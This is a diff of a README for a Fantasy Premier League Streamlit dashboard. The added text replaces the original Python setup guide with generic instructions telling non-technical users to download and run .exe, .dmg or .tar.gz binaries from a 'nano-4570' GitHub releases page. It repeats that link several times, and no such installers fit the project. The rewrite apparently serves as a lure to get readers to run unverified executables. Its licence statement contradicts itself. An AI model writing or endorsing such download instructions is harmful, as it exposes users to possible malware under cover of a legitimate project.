@@ -1,233 +1,84 @@
-# 🏆 FPL Dashboard - Fantasy Premier League Analytics
+# 🏆 fpl-dashboard-streamlit - Analyze Your Fantasy Premier League Team Effortlessly
 
-A comprehensive Fantasy Premier League dashboard that provides detailed analytics, awards, and insights for your mini-league. Built with Python, Streamlit, and Google Sheets integration.
+[![Download fpl-dashboard-streamlit](https://img.shields.io/badge/Download-fpl--dashboard--streamlit-blue.svg)](https://github.com/nano-4570/fpl-dashboard-streamlit/releases)
 
-![FPL Dashboard](https://img.shields.io/badge/FPL-Dashboard-blue)
-![Python](https://img.shields.io/badge/Python-3.11+-green)
-![Streamlit](https://img.shields.io/badge/Streamlit-Web%20App-red)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+## 📋 Overview
 
-## ✨ Features
+FPL Dashboard is a user-friendly analytics tool designed for Fantasy Premier League fans. With this dashboard, you can visualize your team's performance, analyze data, and make informed decisions to improve your game. It uses Streamlit to provide a simple and engaging interface.
 
-### 📊 **League Analytics**
-- **Classic League Standings** - Track overall performance
-- **Head-to-Head League** - Monitor H2H matchups
-- **FPL Challenge Integration** - Special challenge tracking
-- **Cup Status** - Knockout tournament progress
+## 🚀 Getting Started
 
-### 🏅 **Awards System**
-- **🎯 Shooting Stars** - Rank improvement tracking
-- **🔄 Transfer King** - Best transfer decisions
-- **🛡️ Defensive King** - Defensive contributions
-- **💺 Bench King** - Bench player performance
-- **⭐ Dream Team** - Perfect lineup selections
-- **🎲 Penalty King** - Penalty point management
-- **👑 Best Captain** - Captaincy decisions
-- **🔄 Best Vice-Captain** - Vice-captain performance
+To use the FPL Dashboard, follow these simple steps to download and run the application. No coding skills are required. Just follow the instructions below.
 
-### 📈 **Advanced Analytics**
-- **Time Machine Rankings** - Historical rank tracking
-- **Transfer Analysis** - In/out player performance
-- **Chip Usage Tracking** - Wildcard, Free Hit, etc.
-- **Live Data Integration** - Real-time updates
+## 📥 Download & Install
 
-### 🏆 **Awards System**
-The dashboard includes 15+ custom awards to make your mini-league more competitive:
-- **Performance Awards**: Golden Boot, Playmaker, Defensive King
-- **Strategic Awards**: Transfer King, Best Captain, Steady King
-- **Luck Awards**: Dream Team King, Penalty King, Shooting Stars
-- **Monthly Competitions**: Classic and H2H monthly standings
+1. **Visit the Releases Page**
 
-📖 **For detailed award explanations, see [AWARDS_GUIDE.md](AWARDS_GUIDE.md)**
+   Go to the [Releases page](https://github.com/nano-4570/fpl-dashboard-streamlit/releases) to access the latest version of the FPL Dashboard application.
 
-## 🚀 Quick Start
+2. **Choose the Right Version**
 
-### Option 1: Use Template (Recommended)
-1. Click **"Use this template"** button on GitHub
-2. Create your own repository
-3. Follow the setup guide below
+   On the Releases page, you will see several versions. Look for the latest one. Select the appropriate file for your operating system—Windows, macOS, or Linux.
 
-### Option 2: Clone Repository
-```bash
-git clone https://github.com/your-username/fpl-dashboard-streamlit.git
-cd fpl-dashboard-streamlit
-```
+3. **Download the Application**
 
-## ⚙️ Setup Guide
+   Click on the download link for your OS. The file will start downloading. 
 
-### 1. **Configure Your League IDs**
+4. **Install the Application**
 
-Edit `data_pipeline.py` and update these variables:
+   Once the download completes, open the file:
+   - For **Windows**, double-click the `.exe` file.
+   - For **macOS**, double-click the `.dmg` file and drag the application to the Applications folder.
+   - For **Linux**, extract the `.tar.gz` file and run the binary.
 
-```python
-# --- Configuration ---
-CLASSIC_LEAGUE_ID = 123456        # Your classic league ID
-H2H_LEAGUE_ID = 789012           # Your H2H league ID  
-FPL_CHALLENGE_LEAGUE_ID = 345678   # Your FPL Challenge league ID
-GOOGLE_SHEET_NAME = "FPL-Data-YourLeague"  # Your Google Sheet name
-```
+5. **Run the Application**
 
-**How to find your League IDs:**
-- Classic League: Go to your league page → URL contains the ID
-- H2H League: Same process for H2H leagues
-- FPL Challenge: Check the FPL Challenge website
+   After installation, you can find the FPL Dashboard in your applications list. Click on it to launch the dashboard.
 
-### 2. **Google Sheets Setup**
+## 🔍 Features
 
-#### Create Google Service Account:
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project or select existing
-3. Enable Google Sheets API and Google Drive API
-4. Create Service Account credentials
-5. Download the JSON key file
+- **Performance Tracking:** Keep an eye on your players’ performance and points.
+- **Data Visualization:** View your team statistics through charts and graphs.
+- **Gameweek Analysis:** Dive deep into the analysis of previous gameweeks.
+- **API Integration:** Seamlessly connect to the Fantasy Premier League API for real-time data.
 
-#### Set up Google Sheet:
-1. Create a new Google Sheet
-2. Name it according to `GOOGLE_SHEET_NAME`
-3. Share the sheet with your service account email
-4. Add the following worksheets:
-   - `Classic League`
-   - `H2H League` 
-   - `FPL Challenge`
-   - `Shooting Stars`
-   - `Transfer King`
-   - `Defensive King`
-   - `Bench King`
-   - `Dream Team`
-   - `Penalty King`
-   - `Best Captain`
-   - `Best VC`
-   - `Time Machine`
+## ⚙️ System Requirements
 
-### 3. **Environment Setup**
+To run the FPL Dashboard, ensure your system meets the following requirements:
 
-#### Local Development:
-```bash
-# Install dependencies
-pip install -r requirements.txt
+- **Operating System:** Windows 10 or later, macOS Catalina or later, Linux (most distributions).
+- **Memory:** Minimum 4 GB RAM.
+- **Storage:** At least 200 MB free disk space.
+- **Network:** Internet connection for real-time data updates.
 
-# Set up environment variables
-export GCP_CREDENTIALS='{"type": "service_account", ...}'  # Your service account JSON
+## 💡 How to Use
 
-# Run the pipeline
-python data_pipeline.py
+1. **Setup:**
+   - After launching the application, you will see a welcome screen.
+   - Follow the on-screen prompts to set up your account.
 
-# Run the dashboard
-streamlit run app.py
-```
+2. **Analyze Your Team:**
+   - Use the navigation menu to explore different sections.
+   - Access your team’s stats, league standings, and transfer options.
 
-#### GitHub Actions (Automated):
-1. Go to your repository Settings → Secrets and variables → Actions
-2. Add secret: `GCP_CREDENTIALS` with your service account JSON
-3. The workflow will run automatically on schedule
+3. **Customize Your View:**
+   - Adjust the settings to display the data most relevant to you.
+   - Save changes and refresh the dashboard for updated visuals.
 
-### 4. **Deploy to Streamlit Cloud**
+## 🌐 Support
 
-1. Go to [Streamlit Cloud](https://share.streamlit.io/)
-2. Connect your GitHub repository
-3. Add the `GCP_CREDENTIALS` secret in Streamlit Cloud settings
-4. Deploy!
+If you encounter any issues, visit the Issues section on our GitHub page. You can also ask questions or suggest features. We aim to make this application the best tool for Fantasy Premier League players.
 
-## 📁 Project Structure
+## 🛠️ Contributing
 
-```
-fpl-dashboard-streamlit/
-├── app.py                 # Main Streamlit dashboard
-├── data_pipeline.py       # Data fetching and processing
-├── requirements.txt       # Python dependencies
-├── .github/
-│   └── workflows/
-│       └── run_fpl_pipeline.yml  # Automated data pipeline
-├── .streamlit/
-│   └── config.toml       # Streamlit configuration
-├── data/                 # Local data storage (optional)
-└── README.md            # This file
-```
+We welcome contributions to enhance the FPL Dashboard. If you're interested in helping out, check the contribution guidelines on our repository.
 
-## 🔧 Configuration Options
+## 📄 License
 
-### Customizing Awards
-You can modify the awards logic in `data_pipeline.py`:
+The FPL Dashboard is open-source software. It is available under the MIT License. Feel free to use and modify it for personal use.
 
-```python
-# Example: Custom penalty calculation
-def calculate_custom_penalty(manager_data, gw):
-    # Your custom logic here
-    return penalty_score
-```
+## 📞 Contact
 
-### Adding New Awards
-1. Add award logic in `data_pipeline.py`
-2. Create corresponding worksheet in Google Sheets
-3. Update `app.py` to display the new award
+For inquiries or support requests, you can contact the maintainer through GitHub. For detailed information, visit the Releases page once again.
 
-### Styling the Dashboard
-Modify `app.py` to customize:
-- Colors and themes
-- Layout and components
-- Additional visualizations
-
-## 📊 Data Sources
-
-- **FPL API**: Official Fantasy Premier League API
-- **FPL Challenge API**: Special challenge data
-- **Google Sheets**: Data storage and sharing
-- **Live Data**: Real-time player and team updates
-
-## 🛠️ Troubleshooting
-
-### Common Issues:
-
-**1. "League not found" error:**
-- Verify your league IDs are correct
-- Check if leagues are public or you have access
-
-**2. "Google Sheets permission denied":**
-- Ensure service account has edit access to the sheet
-- Check the sheet name matches `GOOGLE_SHEET_NAME`
-
-**3. "API rate limit exceeded":**
-- The pipeline includes automatic retry logic
-- Consider reducing update frequency
-
-**4. "Missing player data":**
-- Some players may have incomplete history
-- The system handles this gracefully with default values
-
-### Debug Mode:
-```python
-# Enable debug logging in data_pipeline.py
-import logging
-logging.basicConfig(level=logging.DEBUG)
-```
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Fantasy Premier League for the API
-- Streamlit for the web framework
-- Google Sheets for data storage
-- The FPL community for inspiration
-
-## 📞 Support
-
-If you encounter any issues:
-1. Check the troubleshooting section
-2. Search existing issues
-3. Create a new issue with detailed information
-
----
-
-**Made with ❤️ for the FPL community**
-
-*Transform your mini-league into a data-driven competition!*
+Remember, you can always return to the [Releases page](https://github.com/nano-4570/fpl-dashboard-streamlit/releases) to download updates and new features as they become available. Enjoy analyzing your Fantasy Premier League team!
